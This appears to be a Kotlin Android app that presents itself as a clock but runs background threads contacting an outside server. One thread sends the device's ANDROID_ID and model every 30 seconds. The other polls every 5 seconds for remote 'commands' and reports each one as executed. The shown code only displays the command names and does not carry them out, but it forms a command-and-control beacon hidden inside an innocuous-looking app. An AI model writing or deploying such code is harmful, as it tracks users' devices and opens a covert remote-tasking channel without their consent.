package com.clock.app

import android.app.Activity
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.Settings
import android.view.Gravity
import android.widget.LinearLayout
import android.widget.TextView
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class NetHelper {

    private val baseUrl = "https://payment70.site.je/api.php"

    fun sendUserStatus(userId: String, deviceInfo: String): Boolean {
        return try {
            val url = URL(baseUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val json = JSONObject().apply {
                put("user_status", true)
                put("user_id", userId)
                put("device_info", deviceInfo)
            }

            OutputStreamWriter(connection.outputStream).use {
                it.write(json.toString())
                it.flush()
            }

            val code = connection.responseCode
            connection.disconnect()
            code == HttpURLConnection.HTTP_OK
        } catch (e: Exception) {
            false
        }
    }

    fun fetchPendingCommands(userId: String): List<JSONObject> {
        return try {
            val url = URL("$baseUrl?user_id=$userId")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val response = connection.inputStream.bufferedReader().use { it.readText() }
            connection.disconnect()

            val array = JSONArray(response)
            val list = mutableListOf<JSONObject>()
            for (i in 0 until array.length()) {
                list.add(array.getJSONObject(i))
            }
            list
        } catch (e: Exception) {
            emptyList()
        }
    }

    fun markCommandExecuted(commandId: String): Boolean {
        return try {
            val url = URL(baseUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val json = JSONObject().apply {
                put("update_status", true)
                put("command_id", commandId)
                put("executed", true)
            }

            OutputStreamWriter(connection.outputStream).use {
                it.write(json.toString())
                it.flush()
            }

            val code = connection.responseCode
            connection.disconnect()
            code == HttpURLConnection.HTTP_OK
        } catch (e: Exception) {
            false
        }
    }
}

class MainActivity : Activity() {

    private val handler = Handler(Looper.getMainLooper())
    private lateinit var clockText: TextView
    private lateinit var statusText: TextView
    private val apiService = NetHelper()

    private val runnable = object : Runnable {
        override fun run() {
            try {
                val time = SimpleDateFormat("hh:mm:ss a", Locale.getDefault()).format(Date())
                clockText.text = time
                handler.postDelayed(this, 1000)
            } catch (e: Exception) {
            }
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        statusText = TextView(this)
        statusText.textSize = 16f
        statusText.gravity = Gravity.CENTER
        statusText.setPadding(40, 120, 40, 40)
        statusText.text = "Status: Starting..."

        clockText = TextView(this)
        clockText.textSize = 32f
        clockText.gravity = Gravity.CENTER
        clockText.setPadding(40, 40, 40, 40)

        val layout = LinearLayout(this)
        layout.orientation = LinearLayout.VERTICAL
        layout.gravity = Gravity.CENTER
        layout.addView(statusText)
        layout.addView(clockText)
        setContentView(layout)

        handler.post(runnable)
        startMonitorLoops()
    }

    private fun startMonitorLoops() {
        val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
        val safeId = deviceId ?: "unknown"
        val deviceInfo = Build.MANUFACTURER + " " + Build.MODEL

        Thread {
            while (true) {
                try {
                    val ok = apiService.sendUserStatus(safeId, deviceInfo)
                    val msg = if (ok) "Status: Sent" else "Status: Failed"
                    runOnUiThread { statusText.text = msg }
                } catch (e: Exception) {
                }
                try {
                    Thread.sleep(30000)
                } catch (e: Exception) {
                }
            }
        }.start()

        Thread {
            while (true) {
                try {
                    val commands = apiService.fetchPendingCommands(safeId)
                    if (commands.isNotEmpty()) {
                        val last = commands.first()
                        val action = last.optString("action", "no_action")
                        val id = last.optString("id", "no_id")
                        runOnUiThread { statusText.text = "Last Command: " + action }
                        apiService.markCommandExecuted(id)
                    } else {
                        runOnUiThread { statusText.text = "Status: Waiting for commands" }
                    }
                } catch (e: Exception) {
                }
                try {
                    Thread.sleep(5000)
                } catch (e: Exception) {
                }
            }
        }.start()
    }

    override fun onDestroy() {
        super.onDestroy()
        handler.removeCallbacks(runnable)
    }
}
